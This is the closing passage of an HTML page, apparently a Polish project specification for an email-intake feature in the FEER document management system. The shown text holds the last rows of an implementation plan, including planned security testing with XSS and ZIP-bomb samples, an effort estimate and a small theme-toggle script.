  <td><strong>4. Integracja z EZD UI</strong></td>
  <td>Przycisk w liście dokumentów, offcanvas/modal podglądu, wątek korespondencji</td>
  <td>1–2 dni</td>
</tr>
<tr>
  <td><strong>5. Rejestracja RPW</strong></td>
  <td><code>register_email.php</code> — formularz, deduplication, auto-wypełnienie</td>
  <td>1 dzień</td>
</tr>
<tr>
  <td><strong>6. Testy i harden</strong></td>
  <td>Złośliwe pliki testowe (XSS, ZIP bomb, zniekształcony OLE), testy WCAG, CSP audit</td>
  <td>2 dni</td>
</tr>
</table></div>

<div class="note ok">
  <b>Łączny szacunek:</b> 9–12 dni roboczych dla jednego developera,
  plus 1–2 dni na review bezpieczeństwa (szczególnie XSS i polityki CSP).
</div>

<hr>
<footer>
  <p>Specyfikacja przygotowana: 2026-07-31 · System Obsługi Organizacji FEER ·
  EZD „Wirtualne Biurko" v2 · Dokument projektowy — nie wdrożona funkcjonalność.</p>
</footer>

</main>
</div><!-- .wrap -->

<script>
(function(){
  var btn=document.getElementById('themebtn'),
      root=document.documentElement,
      stored=localStorage.getItem('feerTheme');
  if(stored)root.setAttribute('data-theme',stored);
  btn.onclick=function(){
    var cur=root.getAttribute('data-theme'),
        next=cur==='dark'?'light':'dark';
    root.setAttribute('data-theme',next);
    localStorage.setItem('feerTheme',next);
  };
})();
</script>
</body>
</html>
